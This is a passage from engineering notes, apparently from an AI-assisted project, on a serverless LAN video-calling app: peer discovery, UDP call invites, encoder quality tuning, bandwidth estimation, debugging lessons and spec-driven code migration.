  through `INFOPLIST_KEY_*`); that replaces `GENERATE_INFOPLIST_FILE`.
- **UI:** `PeerRoster` observes `PeerDiscovery` directly; tap Call -> `callPeer` (resolve -> 1-1); tick several
  -> `startGroupFromSelection` (resolve all -> comma-join -> group). NOT MultipeerConnectivity (owns its own
  transport, can't return an IP for our socket).
- **VERIFIED headless on Mac:** `dns-sd -B _trinet._udp` shows the app by instance name; `dns-sd -R "TestPhone"
  _trinet._udp local 7000` -> app logs `roster 1 peer(s): TestPhone`, drops on removal.
- **iOS DONE:** `PeerDiscovery` class EMBEDDED at the end of `VideoPipeline.swift` (iOS sources glob the
  TriNetVideo/ dir, so no pbxproj edit needed; added `import UIKit` for the UIDevice default name); `iPeerRoster`
  in Views + `discovery`/`callPeer`/`callEveryone`/`startGroupFromSelection` in StreamViewModel; `NSBonjourServices`
  added to `phone/project.yml` info. Compiles; needs device build to verify.
- **Rooms + status (2026-07-20 "все три"):** TXT `room=` (empty=open lobby; set=browse filters to same room +
  "Call room" calls everyone) + `status=idle|call` (advertised on call start/stop via `discovery.inCall`, shown
  as an orange "in call" badge). Editable display name via `setName`/`setRoom` -> republish (cancel+re-advertise
  the NWListener; NWListener can't mutate TXT live). VERIFIED on Mac: `dns-sd -Z` shows
  `"name=MacBook Pro" "uid=..." "port=7000" "room=" "status=idle"`.

## INCOMING CALL ("take the call" — ringing screen + Accept/Decline) — 2026-07-20

Discovery lets you SEE peers; this lets a call RING so the callee can pick up instead of everyone having to
tap "Call room". Full-mesh is preserved — Accept just auto-fills the caller's IP and calls back.

- **Signaling is a tiny plaintext INVITE on the SAME transport port (:7000), demuxed by a 2-byte magic
  `[0xFD 0x11] + callerNameUTF8`.** NOT a new port, NOT Bonjour (TXT is presence, not real-time). The callee
  learns the caller's IP from `recvfrom`'s source addr — the packet carries only the name.
- **The `:7000` handoff is the whole trick.** While IDLE, hold a light UDP listener on :7000
  (`startIdleListener`, SO_REUSEADDR, blocking `recvfrom` on a serial queue). The encrypted transport ALSO wants
  :7000 the moment a call starts, so `startCall()` calls `stopIdleListener()` FIRST (close(fd) -> the blocking
  recvfrom returns <=0 -> loop breaks), then the transport binds. `endCall()`/`stopCall()` calls
  `startIdleListener()` again. UDP releases the port immediately on close, so no bind race (with SO_REUSEADDR).
  Only ONE app instance can hold :7000 — kill stale instances before deploy (a busy :7000 = silent no-ring).
- **Caller rings from a THROWAWAY socket** (`sendInvite(to: ips)`): its own transport already owns :7000, so it
  sends the INVITE from an unbound socket to each `target:7000`, x4 with ~150ms spacing (UDP is lossy). Wired
  into `startCall` right after computing `hosts` so both 1-1 and group ring.
- **TWO bugs made "nothing happens on the callee" (user: «Вообще ничего»), both about a BLOCKED recvfrom on a
  SERIAL queue — fixed 2026-07-20:**
  1. `sendInvite` ran on `idleQueue` — the SAME serial queue the idle-listener's blocking `recvfrom` sits on.
     `startCall()` calls `stopIdleListener()` (close the socket) right before, but **POSIX `close()` does NOT
     reliably wake a `recvfrom` blocked in another thread**, so the queue stays occupied and the INVITE
     `idleQueue.async` NEVER RUNS — the callee is never rung. Fix: send from `DispatchQueue.global()`, never a
     queue that a blocking syscall might own.
  2. Same blocked-recvfrom leaks the idle listener across calls: after a call ends, `startIdleListener()`
     enqueues a NEW loop behind the OLD (still-blocked) one on the serial queue, so incoming calls die after
     call #1. Fix: `SO_RCVTIMEO` (1s) on the idle socket + treat `EAGAIN/EWOULDBLOCK` as "continue, re-check
     `idleFd`" so the loop EXITS within 1s of `stopIdleListener()`. Verified: the listener survives multiple
     timeout cycles AND still catches a synthetic INVITE.
- **Ring receiver dedups + auto-misses:** guard `!isInCall && incomingCall == nil` (the caller sends 4 INVITEs +
  then media — the encrypted media also hits the idle listener; a 2-byte magic false-matches ciphertext ~1/65536,
  harmless). A 40s `Timer` clears `incomingCall` (auto-miss); Accept/Decline invalidate it.
- **ROOT LAW — serverless mesh, so EVERY endpoint must initiate.** There is no host/answerer: a 1-1 call only
  forms when BOTH sides run `connect()` toward each other (each drives its own 250ms handshake), and a group only
  forms when EACH device runs `connectGroup([the others])`. This is exactly why "iPhone->Mac works but
  iPhone->iPhone doesn't": the Mac had the incoming-call build (rings->accept->calls back) and the iPhones did
  not, so the callee iPhone never initiated its half. The crypto is symmetric and innocent (ECDH + HKDF on
  constant salt/info); the asymmetry is always "who called back". Fix = build the ring feature onto BOTH ends.
- **Accept = REBUILD THE MESH, not a 1-1 back to the caller.** The INVITE payload is `name\nip1,ip2,ip3` — the
  FULL participant list (caller's `[myIP]+hosts`). `acceptIncoming()` does `Set(participants) + caller.ip -
  myIP`, joins with commas, and `startCall()`s that — so a group invite rebuilds the whole mesh (A<->B, A<->C
  AND B<->C), while a 1-1 invite (list = {caller, me}) collapses to a plain 1-1. Bug that was here first:
  `remoteIP = inc.ip` (single IP) made a STAR (A<->B, A<->C, no B<->C), so 3-way never fully connected.
- **AUTO-JOIN a GROUP (or same-room) call — the fix for "call from the Mac -> both iPhones just work".** The
  INVITE payload is `name\nip1,ip2\nROOM`. The idle listener `acceptIncoming()`s IMMEDIATELY (no ring) when
  `participants.count > 2` (a group = caller + me + others) OR the caller's room == my non-empty room. A plain
  1-1 (`participants == {caller, me}`, count 2) still RINGS so you can pick up the handset. This is why a Mac
  group-calling 2 iPhones now forms without anyone tapping Accept: the Mac's INVITE lists 3 participants, each
  iPhone auto-joins and rebuilds the mesh. Verified on Mac: a 3-participant INVITE logged `auto-joining group …
  3 participants` -> `GROUP transport up`, no ring. (The GROUP crypto is fine — Mac `MeshTransport.confKey`
  == iOS `BSDTransport.confKey`, same HKDF salt `trios-mesh/v1/conference`; the fan-out sends to every peer.
  The only thing missing before was that the callees never JOINED.) Verified on Mac: `defaults write com.trinet.monitor trinetRoom
  ABCD` + an INVITE with room `ABCD` logged `auto-accepting … same room 'ABCD'`, not a ring.
- **iOS SCREEN SHARE is a genuinely separate device-session feature** (`phone/SCREEN_SHARE_iOS.md`): needs a
  Broadcast Upload Extension = a new app-extension TARGET + App Group + device provisioning. This repo's iOS
  project must NOT be regenerated (breaks signing), so the target can't be added headlessly, and broadcast
  capture can't run in the Simulator — so it can't be built OR verified here. The plan + SampleHandler skeleton
  are written out in that file; finish it on the device machine. Don't fake it as done.
- **UI (from a UX-research pass — FaceTime/WhatsApp/CallKit conventions):** Decline = red, LEFT; Accept = green,
  RIGHT (iOS muscle memory — never swap). iOS = **full-screen takeover** (`IncomingCallOverlay`, ~76pt circular
  buttons, pulsing concentric rings behind the avatar, `AudioServicesPlaySystemSound(kSystemSoundID_Vibrate)`
  looped every 2s — `import AudioToolbox`). macOS = **corner/top notification card** (`IncomingCallBanner`,
  NOT full-screen — a Mac is multi-window). Both: `@Environment(\.accessibilityReduceMotion)` gates the pulse;
  `.accessibilityLabel` on the icon buttons (color alone is invisible to VoiceOver).
- **Why not CallKit:** CallKit's background/lock-screen ring needs a **PushKit VoIP push via APNs** — impossible
  to originate peer-to-peer over a LAN UDP socket. A foreground in-app overlay is the only sanctioned path for a
  serverless LAN app; accept that it only rings while the app is foregrounded.
- **IPv6 KILLS THE CALL — force IPv4 in `resolveIP`.** The transport is IPv4-only (`sockaddr_in`, `inet_addr`).
  Bonjour on iOS resolves a peer's endpoint to an **IPv6 link-local (`fe80::…`) FIRST**, and `inet_addr` can't
  parse it -> returns `INADDR_NONE` (== the broadcast `255.255.255.255`), so every datagram silently sprayed the
  subnet and the call never connected (user caught it: "зачем ты выбрал ip6"). Fix, BOTH resolveIP copies (Mac
  PeerDiscovery.swift + iOS embedded in VideoPipeline.swift): build the NWConnection with
  `let p = NWParameters.udp; (p.defaultProtocolStack.internetProtocol as? NWProtocolIP.Options)?.version = .v4`,
  and map the `.ipv6` case to `nil`. Plus a LOUD guard in `connect()`: reject a host containing `:` or whose
  `inet_addr == INADDR_NONE` instead of broadcasting. This is why iPhone->Mac limped but iPhone<->iPhone died:
  iPhone-to-iPhone Bonjour resolve lands on v6 far more often.
- **VERIFIED headless (Mac receive path):** deployed, idle listener bound :7000, a synthetic
  `python3 sendto(b'\xfd\x11TestCaller', ('127.0.0.1',7000))` logged `INCOMING call from TestCaller (127.0.0.1)`.
  Send path = identical wire format (proven compatible). iOS compiles; the 3-device ring->accept->connect loop
  needs real devices + user's eyes (cannot verify headlessly — no device build, simulator has no camera).

## VIDEO QUALITY — encoder settings that actually move quality-per-bit — 2026-07-20

The iOS and Mac H.264 encoders had DRIFTED and iOS was badly throttled. FOUR fixes, both platforms,
verified accepted in a standalone `swiftc` VideoToolbox harness (`scratchpad/enc_quality_harness.swift`:
sets each property, checks `noErr`, READS BACK the profile, encodes 60 frames, asserts keyframe cadence +
NAL flow). Read-back matters — VT silently CLAMPS unsupported values instead of erroring.

- **LOW-LATENCY rate control** — the master switch. `kVTVideoEncoderSpecification_EnableLowLatencyRateControl
  = true` in the `encoderSpecification` dict of `VTCompressionSessionCreate` (NOT a session property; iOS
  14.5+/macOS 11.3+, targets are 15/14 so unconditional). Swaps the encoder's rate controller for the RTC one
  (fast reaction, no big VBV buffer) and is the GATE for LTR / temporal-SVC / `MaxAllowedFrameQP` later.
  GOTCHA the harness caught: with low-latency ON, `kVTCompressionPropertyKey_MaxFrameDelayCount` errors
  **-12900 (unsupported)** — the mode already emits each frame immediately, so DON'T set it.

- **H.264 HIGH profile, not Main** (`kVTProfileLevel_H264_High_AutoLevel`). High adds the 8x8 transform +
  better intra prediction -> ~5-10% better quality-per-bit at the same bitrate; every Apple decoder supports
  it; still CABAC, still no B-frames (AllowFrameReordering=false -> no latency). The fragment/mesh layer is
  codec-opaque so nothing downstream cares.
- **RARE keyframes.** iOS was `MaxKeyFrameInterval=10 + Duration=0.5` = an I-frame every ~0.5s; an I-frame is
  ~5-10x a P-frame, so half the bit budget was spent on keyframes and the P-frames (i.e. the actual detail)
  starved. Set both platforms to `MaxKeyFrameInterval=150 + MaxKeyFrameIntervalDuration=5.0` (~5s). Safe
  because recovery is **PLI-driven**: the decoder's `awaitingIDR` asks the peer for an IDR on loss/join, so we
  don't need a metronome of keyframes. Harness proved exactly 1 IDR in 60 frames.
- **Real VGA bitrate on Wi-Fi.** iOS ceiling was a flat `maxBitrate=200_000` (Mac already used
  `min(2_000_000, w*h*2)` ≈ 600k for VGA). 200k starves VGA to mush. iOS now uses the SAME mode-aware ceiling:
  `meshMode ? meshBitrate(150k) : min(2_000_000, w*h*2)` in BOTH `setup()` and `applyCeiling()`. The node's
  AIMD (0.92 down / +8k up) still governs the actual rate and backs off on loss; this only raises the CEILING
  it may climb to when the link is good. Mesh/radio stays capped, group still splits via `setMaxBitrate`.
- **Still TODO (higher risk, deferred):** adaptive RESOLUTION (VGA<->720p<->360p by link) — the single biggest
  perceptual win but needs a clean mid-call VTCompressionSession teardown/recreate + AVCaptureSession preset
  change; LTR frames for IDR-free loss recovery; a delay-based bandwidth estimator (GCC-lite) to raise bitrate
  BEFORE loss; a video jitter buffer. Verify each on device — headless can only prove "settings accepted".

## iOS<->Mac CALL FEATURE PARITY — audit + record button — 2026-07-20

The user asked to "mirror all Mac call functions onto iOS." INVENTORY FIRST (don't assume — read both control
bars): iOS already had mute, camera-flip, camera-off, blur, chat, reactions, group+roster, incoming call,
mic/in meters, frame counters, log toggle, AND recording (CallRecorder + share sheet). It was NOT missing the
features — recording was just hidden as a tiny top-bar "Rec" pill, so the user couldn't find it.

- **Record button moved into the main control row** (`iBtn record.circle/record.circle.fill`, `active` -> red
  while recording), mirroring the Mac's bottom-row REC. The old top-bar pill became a PASSIVE `REC` indicator
  shown only while recording. So the toggle is where the Mac's is; the indicator persists at the top.
- **Row fit: 7 controls on a phone.** 46pt circles overflow a 375pt iPhone SE at 7-across. Fix: the row uses
  equal-width `.frame(maxWidth: .infinity)` cells, so it NEVER overflows horizontally — it just needs each
  fixed circle <= cell width (usable/7 ~= 45pt on SE). Shrank `iBtn` 46->42pt (font 18->16) + End button 46->42
  + spacing 6->4. Tap target stays the full flexible cell, so 42pt visual is still comfortable.
- **"Not all buttons work" was a LOCAL-FEEDBACK gap, not dead buttons (2026-07-20).** Every iOS control is wired
  to a real method (audited). But **blur** and **camera-off** change the OUTGOING stream, and the local self-PiP
  is a raw `AVCaptureVideoPreviewLayer` that shows NEITHER — so the user toggled them, saw no change on their
  own screen, and concluded "broken" (the far end WAS affected). Fix: make the PiP reflect state — a
  `video.slash` placeholder when `cameraOff`, a "BLUR" badge when `isBlurred`. Lesson: a control that only
  affects what the PEER sees needs an explicit local indicator or it reads as a no-op. (Group tiles were also
  hard-coded 3:4 — fixed to 16:9 to match the camera.)
- **The ONE real gap: screen sharing.** Mac uses ScreenCaptureKit (whole-desktop). iOS screen share of OTHER
  apps needs a **Broadcast Upload Extension** — a SEPARATE app target + app-group + shared memory. The iOS
  target compiles a STATIC file list (never regenerate), so this is a real feature/wave, NOT a mirror. In-app
  `RPScreenRecorder.startCapture` only captures the app's own UI (useless for "share my screen"). Flag it
  honestly; don't fake it.
- Verified: iOS builds; Simulator renders the home screen clean and the roster already shows the live Mac
  ("MacBook Pro - in call") + another peer. The in-call 7-button row can't be screenshotted headlessly (needs a
  live call/camera the Simulator lacks) — fit is guaranteed by the flexible-cell geometry above.

## ADAPTIVE RESOLUTION LADDER — 2026-07-20 (biggest low-bitrate quality lever)

WebRTC's #1 lever: below a bitrate threshold, drop RESOLUTION (not just bitrate) so each pixel stays
well-coded — a small SHARP frame beats a big blocky one. Both encoders now do this.

- **Ladder** keyed to the AIMD's `curBitrate`, ALL 4:3 (VGA-native): 640x480 >=340k / 480x360 >=200k / 320x240
  >=110k / 256x192 else. `targetRung()` picks the highest rung whose floor <= curBitrate. Ceiling is 900k
  (VGA-appropriate), not 1.8M.
- **ASPECT — the picture squished THREE times before it was killed for good. Root cause is ALWAYS anamorphic
  (non-uniform) scaling: the output W:H differs from the content's W:H.** Sources of the mismatch here:
  1. A 4:3 ladder rung fed from a 16:9 camera (FrameScaler does `scaleX=w/sw, scaleY=h/sh` — squish).
  2. Forcing a 4:3 capture buffer (`output.videoSettings` 640x480) on the 16:9 FaceTime HD sensor (squish AT
     CAPTURE, before anything downstream). This is the sneaky one — the display layers already use
     `resizeAspect`/`resizeAspectFill` (they NEVER squish), so if the picture looks stretched the squish is
     upstream, in the encoded frame, from capture or the scaler.
  **BULLETPROOF FIX (final):** the ladder specifies target HEIGHT only; `encode()` computes WIDTH from the LIVE
  camera frame's real aspect: `wantW = ((wantH * srcW / srcH) + 1) & ~1` (even). Uniform scale by construction
  → the output aspect == the source aspect for ANY camera (verified across 16:9 / 4:3 / 1080p sources). Also set
  the Mac `output.videoSettings` to 1280x720 (matches the 16:9 sensor, no capture squish) and all display
  containers to 16:9. Never hard-code a rung's WIDTH again — derive it from the source.
- **Downscale-before-encode, recreate-on-step.** A `FrameScaler` (CoreImage render into a pooled buffer of the
  camera's own pixel format — the SAME pattern the shipping BackgroundBlur uses, so NV12 render is proven;
  identity when src==dst so the top rung is free) shrinks each frame to the rung. On a rung CHANGE the encoder
  `VTCompressionSessionInvalidate`s and recreates at the new size + forces an IDR. The decoder already re-inits
  on the SPS change (`if s != sps { formatDesc=nil; session=nil }`), so it's end-to-end safe.
- **CRITICAL: decouple the AIMD ceiling from the encoded size.** `maxBitrate` is now FIXED
  (`meshMode ? meshBitrate : 1_800_000`), NOT `w*h*2` of the current frame. Otherwise it's a deadlock: a VGA
  session caps curBitrate at ~600k, which never reaches the 1.1M needed to step UP to 720p, so the ladder can
  never climb. The AIMD floor also dropped to an absolute (80k iOS / 100k Mac, was maxBitrate/8) so curBitrate
  can fall far enough to reach the SMALL rungs on a weak link.
- **PRESERVE curBitrate across a session recreate.** `setup()` seeds it once (`if curBitrate == 0`) and
  otherwise only clamps to maxBitrate — a recreate must NOT reset the rate to the ceiling, or every step would
  re-spike the bitrate. `curBitrate` default is 0 (uninitialized); `encode()` seeds it before the first
  `targetRung()` read (mesh->meshBitrate, Wi-Fi->900k ~ 540p start).
- **Cameras raised to 720p** (iOS preset `.hd1280x720`; Mac preset + output `videoSettings` 1280x720) so the
  top rung has REAL detail to downscale from — upscaling VGA to 720p buys nothing.
- **Hysteresis:** one step per 3s max (rate-limited on `lastResStep`) so it can't thrash on a jittery estimate.
- **Mesh-aware:** `targetRung()` caps width to 320 in `meshMode` so keyframes stay under the 17850B NAL ceiling
  (relevant: at VGA/600k a keyframe already measured 18032B in a live log — bigger frames need the radio cap).
- **Verified** (`scratchpad/ladder_harness.swift`): CoreImage downscale 1280x720->320x240 produces a 320x240
  buffer; a VTCompressionSession invalidated + recreated at a DIFFERENT size mid-stream emits a fresh keyframe
  (2 keyframes across 2 sizes). On-device perceptual quality + the 720p capture cost need the user's eyes/logs
  — watch for `TRINET: encoder resolution WxH @ Nkbps` lines to see the ladder stepping.

## DEBUGGING "video doesn't go" — observability before theory — 2026-07-20

A user log showed the call connecting, audio (Opus) flowing, encoder stepping the res ladder (540p->720p),
but NO `FIRST FRAME DECODED` and a flood of `dropped unauthenticated datagram 1234B`. Two obstacles + one lead:

- **The RTI radar log DROWNS the video diagnostics.** On 3 nodes the detector churns hundreds of short-lived
  `TRACK #N LOCKED/LOST` + a jittery zone edge spamming `ALARM INTRUSION`/`left the zone` every cycle — the
  shared Log pane fills with RTI noise and the video path is invisible. Added a `rtiLogGate()` throttle (~1 RTI
  line / 2s) around all four RTI NSLogs in RTIHeatmap.swift. Verified: 1 RTI line in 6s (was hundreds). The
  phantom flood itself (ill-posed 3-node detector) is a separate open bug; this only quiets the LOG.
- **`dropped unauthenticated datagram` never said WHO sent it.** On a shared LAN with several TRI-NET devices
  (roster "17, Yo"), a stray peer blasting :7000 fails our session key and is BENIGN; our own peer failing is a
  REAL bug. The old log (MeshCrypto.unseal) had no source IP, so the two were indistinguishable. Added a
  transport-level `dropByIP` log (Mac MeshTransport + iOS BSDTransport) printing the sender IP, tagged
  `OUR PEER — REAL BUG` vs `stray peer (ignore)` by comparing to the stored `peerHostStr`. Decisive next-log
  diagnostic. `rx #N` now also prints `from <ip>`.
- **Suspicion:** the 1234B (== a max sealed fragment) drops are NEW since the 720p/adaptive-res wave — either
  bigger keyframes stress the path, or (more likely) stray multi-device traffic. The IP tag settles it. Also
  seen again: `canAddOutput=false` on a 2nd call (camera data-output not re-attaching on repeat calls).

## CAMERA-OFF = BLACK, not a freeze — 2026-07-20

"Turn camera off" used to just STOP sending (`guard !cameraOff` in the onFrame/onNALUnit send path), so the peer
FROZE on the last frame. Zoom-style fix: keep the stream ALIVE and send BLACK frames.
- `CameraCapture`/iOS camera gained `var blackout`; `captureOutput` encodes `blackFrame(like: pb)` when set —
  a CACHED black `CVPixelBuffer` of the frame size, filled with TRUE black via `CIContext.render(CIImage(color:
  .black)…)` (format-agnostic — memset(0) on NV12 is green, not black). Black H.264 frames are tiny, so the
  bandwidth cost is negligible and the transition (real->black) rides a normal P-frame; no forced keyframe.
- Wire: `cameraOff { didSet { camera.blackout = cameraOff } }`, and REMOVE `!cameraOff` from the send guard
  (else the black frames get skipped). Keep the `!isScreenSharing` guard on Mac.
- Local self-preview also blacks out (a `Color.black` + `video.slash` overlay on the PiP), since the raw
  preview layer keeps showing the live camera otherwise.
- **`canAddOutput=false` on the 2nd call was a FALSE ALARM born of a lifecycle mismatch (fixed 2026-07-22).**
  Mac `CameraCapture.stop()` leaves the data output ATTACHED to the AVCaptureSession (it only stops running);
  `start()` then re-ran the full setup and asked `canAddOutput(sameInstance)` — which is false for an
  already-attached output, logging a scary "NOT attached" for what is actually REUSE. WebRTC-style rule: the
  capturer OUTLIVES a call; configuration must be IDEMPOTENT. Fix: `if session.outputs.contains(output)` ->
  reuse silently; only a genuinely un-attachable fresh output is an error. (iOS was already safe via the
  `guard !session.isRunning` in startPreview.)

## WAVE ABC 2026-07-22 — climb acceleration + call UX + t27 wave 2

- **A: Escalating additive increase** (slow-start style, both encoders): consecutive clean ABR ticks DOUBLE the
  climb step (8k->16k->32k->64k cap iOS; 10k->…->80k Mac); any loss resets to base. Replaces the flat +8k/+10k
  that took ~100s to regain 900k after one dip. Multiplicative decrease untouched, so back-off is instant. This
  is the additive-increase half of GCC-style probing — a real delay-based estimator is still future work.
- **B: Caller/callee status.** Caller: `status = "Calling <ip>…"` + a 30s no-answer timer (`framesReceived ==
  0` -> "No answer" / iOS `noAnswer` -> StatusTag). Callee: an un-answered 40s incoming ring is recorded into
  `missedCalls` (Identifiable, capped 5, newest first) with a one-tap "Call back" row on the start screen —
  BOTH platforms. Declines are NOT missed (a decline is a choice).
- **C: t27 wave 2 — the include! flip actually landed.** `cargo build` regenerates `gen/rust/rti_alert.rs`
  from the new spec (build.rs `rerun-if-changed=specs/`); `src/rti_alert.rs` now does
  `pub mod gen { include!("../gen/rust/rti_alert.rs") }` (with `#[allow(needless_return, unused_parens,
  dead_code)]` — the t27c emitter style) and calls `gen::alert_severity(anom_sev)` instead of the hand ladder.
  `cargo test --lib`: rti_alert 3/3 + wire 8/8 pass. NOTE: the workspace BIN `tri_rti` was ALREADY broken by
  someone else's uncommitted `LinkMeasurement.link_quality` field — scope builds/tests to `--lib` until that's
  fixed; it is NOT caused by the spec work.

## WAVE 2026-07-22 #2 — delay-based BWE + discovery.t27 + tri_rti fixed

- **Delay-based BWE v1 (receiver report), both platforms.** Receiver measures inter-arrival jitter of VIDEO
  datagrams (RFC3550 EMA: `mean += (gap-mean)/16; J += (|gap-mean|-J)/16`) + pkts/sec, reports once a second in
  `[0xFD 0xBE jitterMsBE:2 pktsBE:2]` (6B, sealed like all control). Sender: peer jitter > 40ms for 2
  consecutive reports -> `nudgeBitrate(down)` BEFORE loss (resets the escalating climb too); < 40ms clears the
  streak. This is the delay-based half of GCC: rising receive jitter = a queue building somewhere.
- **Control-packet hygiene (doctrine enforced):** the 1-1 receive paths fed ANY unmatched packet to the H.264
  decoder. New rule in code: after all known control handlers, `data[0] >= 0xFB -> drop` — real Annex-B NALs
  always start 00 00 00 01, so this can never eat video, and unknown/future control (like 0xFD 0xBE from a
  NEWER peer) can never corrupt an OLDER decoder. `noteVideoArrival()` only runs on actual video.
- **MISSED-call mechanism verified LIVE:** synthetic INVITE left unanswered 40s -> log `MISSED call from DO NOT
  ANSWER test` + row recorded. (First attempt failed because the USER клацнул Accept on the test banner — the
  Mac then held a self-call to 127.0.0.1. Test-INVITE lesson: name the caller "DO NOT ANSWER".)
- **t27 wave 3: `specs/discovery.t27`** (HDR_LEN/MAC_LEN/hello_len/mac_offset/parse_len_ok/is_fresh, tests for
  33B empty + 45B 3-neighbor + truncation + freshness both directions) — typechecked, generated, and WIRED:
  `src/discovery.rs` `include!`s it; parse gates + to_bytes capacity now come from the spec. discovery tests
  14/14 pass.
- **`tri_rti` bin fixed:** added `link_quality: 1.0` (= clean link, as all compiling call sites use) to the 31
  `LinkMeasurement` initializers someone left broken. FULL `cargo build --release` is green again (not just
  --lib).

## WAVE 2026-07-22 #3 — BWE visible + LOOPBACK e2e proof + self-call guard

- **BWE is now user-visible** (Zoom-style net indicator): a `net <peerJitterMs>ms · <bitrateKbps>k` capsule in
  the in-call top bar, green under the 40ms back-off threshold, red above. Both platforms.
- **LOOPBACK e2e harness for the whole new receive path:** send a 3-participant INVITE listing 127.0.0.1 ->
  auto-join fires -> the Mac group-calls itself -> its own video loops back through frag/seal/unseal/reassembly.
  Verified live: `auto-joining group … 3 participants` -> `GROUP transport up — 3 peers` -> `GROUP video from
  127.0.0.1` (the >=0xFB control guard did NOT eat video) -> `BWE … peer jitter 2-5ms` (reports flowing). This
  is the cheapest true end-to-end video test that exists headless — reuse it.
- **Self-call guard:** a roster peer can be ANOTHER APP ON THE SAME HOST (the iOS Simulator advertises
  `_trinet._udp` and resolves to the Mac's own IP). The user tapped it -> the Mac called itself -> undecryptable
  noise + a stuck call. `callPeer` now refuses when the resolved IP == our own IP (log + status); hand-typed
  127.0.0.1 stays allowed (deliberate loopback). ALSO: kill the Simulator instance after UI checks — it
  pollutes the roster ('iPhone 17 Pro').
- **PARALLEL-ACTOR AWARENESS:** a second 15m cron loop runs in this session and EDITS THE SAME FILES (it added
  the GCC probe-up branch to handleBWEReport — `j < 20` streak -> extra climb tick — which this wave's loopback
  then verified live: `BWE probe-up — peer jitter 5ms, capacity spare`). Before claiming "I didn't write that",
  grep the file; before editing, expect the tree to have moved. Log-scoping lesson (bitten TWICE): the monitor
  log spans DAYS — always filter with the FULL date (`awk '/2026-07-22 14:2[7-9]/{f=1} f'`), never bare HH:MM.

## WAVE 2026-07-22 #4 — smoke/loopback_call.sh + index cleanup + routing verified

- **`smoke/loopback_call.sh` (PASS, in-repo):** one-command e2e video test. Restart app (pkill by BARE
  `TriNetMonitor` — ghost instances launched from build dirs share the log and steal :7000; a path-scoped
  pkill misses them), HANDSHAKE WITH THE LOG (wait for a fresh `idle listener up` after a full-date MARK —
  never a blind sleep), send a 3-participant INVITE incl 127.0.0.1, PASS on `GROUP video from 127.0.0.1` or
  `FIRST FRAME DECODED`, then restart clean. Verified: auto-join -> 3-peer group -> own video decoded.
- **THE UDP ONE-DATAGRAM TRAP (cost 2 failed runs):** `printf '\xfd\x11name\nips\n' > /dev/udp/...` in bash
  issues MULTIPLE write()s -> MULTIPLE datagrams: the app got magic+name only (rang a participant-less call;
  `accepting call -> mesh back to 127.0.0.1` with an empty list was the tell). A PIPE coalesces writes, so
  `bash printf | xxd` compares byte-identical to python — the SOCKET does not coalesce. Any multi-byte UDP
  test payload must be sent with a single sendto() (python one-liner in smoke scripts is fine — smoke/ is the
  allowed test-runner zone).
- **git index cleanup:** 13425 staged files -> 273 by unstaging `cwasm/target/`, `phone/desktop/.dd/`,
  `phone/desktop/build/`, `phone/build-ios/` (13k build artifacts someone had staged); those paths are now in
  `.gitignore`. The remaining 273 staged foreign files (gen/specs/src/docs from other sessions) are left for
  the user to review — do not commit unreviewed foreign content.
- **routing.t27 was ALREADY DONE by the parallel loop** (`specs/routing_etx.t27`, 16 test/invariant blocks,
  milli-fixed-point `etx_milli` + `is_feasible`, wired at `src/routing.rs:18`). Verified: typecheck OK,
  routing tests 19/19. t27 migration now: wire, rti_alert, discovery, routing_etx = 4 files spec-first.

## WAVE 2026-07-22 #5 — t27 reconciliation + rti_security.t27 fixed (parallel actor == CODEX)

- **The "parallel actor" is the user's CODEX session** (they said so) — same working tree, own remote branches.
  Its `feat/trios-integration` (Jul 21) touches src/{crypto,daemon,discovery,lib,router,routing,wire}.rs with
  NO t27 includes — a future merge must resolve routing in favor of the SPEC (repo law), folding their
  NaN-safe-ETX idea into routing_etx.t27 tests.
- **RECONCILE BEFORE YOU BUILD: the tracker lied.** A grep for `include!("../gen/rust/` found SIX wired files —
  modem.rs (modem_frame.t27) and router.rs (router_ttl.t27) were already flipped by Codex, unknown to the
  tracker. Habit: before starting a t27 wave, regenerate the map from the CODE (`grep -l 'include!("../gen/rust'
  src/*.rs`), never trust the tracker doc.
- **`rti_security.t27` was BROKEN in-tree (typecheck: cannot assign I32 to U16) and the build swallowed it
  silently** — build.rs regenerates what it can and skips failures without failing the build, so a broken spec
  ships a STALE gen file. Sweep habit: `for s in specs/*.t27; do t27c typecheck $s; done` on every wave.
- **t27c-0.1.0 REASSIGNMENT TRAP (corrected):** the first diagnosis ("literals coerce, division doesn't") was
  WRONG — a `tail -1` on the typecheck output hid 3 of 4 errors (broken-ruler, again: read the FULL output).
  Truth: t27c-0.1.0 rejects ANY reassignment of a typed local (`let t: u16 = ...; t = 40;` -> "cannot assign
  I32 to U16" + immutable warning). The working idiom in every green spec is EARLY-RETURN pure functions — no
  local mutation at all. rti_security's threshold ladder was rewritten as `alert_threshold(sensitivity,
  is_night)` with pure returns (day 40/60/80, night 20/30/40): typecheck 0 errors 0 warnings, full
  `cargo test --lib` 169/169. The new `specs-typecheck` pre-commit hook is what caught the half-fix.

## WAVE 2026-07-22 #3 — link badge + routing_etx.t27 (equivalence-first)

- **Link-quality badge, both platforms** (what Zoom/Meet show as "bars" — the BWE was invisible before):
  in-call `"<bitrateKbps>k · jit <peerJitterMs>ms"`, red when jitter > 40ms (the BWE back-off threshold). Mac
  already published both; iOS gained `@Published bitrateKbps` refreshed in the 1s BWE tick. Observability
  doctrine: a control loop the user can't SEE can't be trusted on device.
- **t27 wave 4: `specs/routing_etx.t27` — the EQUIVALENCE-FIRST pattern for lifting FLOAT code.** routing.rs's
  ETX is f32 (ratios, INFINITY) and t27 is integer-only, so the spec formalizes it in MILLI fixed-point
  (1000 = 1.0; DEAD = sentinel 0 since real ETX >= 1000; `etx_milli = 1e9/(df*dr) * pen/1000`), with
  9 tests + 2 invariants. Typechecked, generated, include!d into routing.rs, and a HAND-WRITTEN Rust test
  (`spec_fixed_point_etx_matches_f32`) pins the generated integer math to the live f32 at 5 points (<= 2 milli
  diff) + the exact dead threshold. routing tests 18/18. The LIVE path still runs f32 — rewiring the mesh's
  heart waits for a radio test rig; the spec is now the SSOT and the equivalence test will catch drift.
  This pattern (spec in fixed-point + equivalence pin, rewire later) is how the remaining float files
  (gf16 host model, rti) should be lifted.

## WAVE 2026-07-22 #4 — modem_frame.t27 + tap-to-expand link-stats panel

- **t27 wave 5: `specs/modem_frame.t27`** lifts the BPSK modem's INTEGER frame geometry (the Barker
  CORRELATION stays f32 — noisy IQ matched filter — but the layout is integer): PREAMBLE_LEN 13, BITS_PER_BYTE
  8, MAX_PAYLOAD 255, PEAK 13, SYNC_THRESHOLD 8; `frame_symbols(n)=13+8+n*8`, `min_parse_len=21`, `can_parse`,
  `payload_fits`, `decode_fits(sym_start,out_len,total)`, `is_synced`, `sync_margin_pct=61`. 9 tests + 3
  invariants. WIRED into src/modem.rs: `can_parse` replaces `samples.len() < BARKER13.len()+8`, `decode_fits`
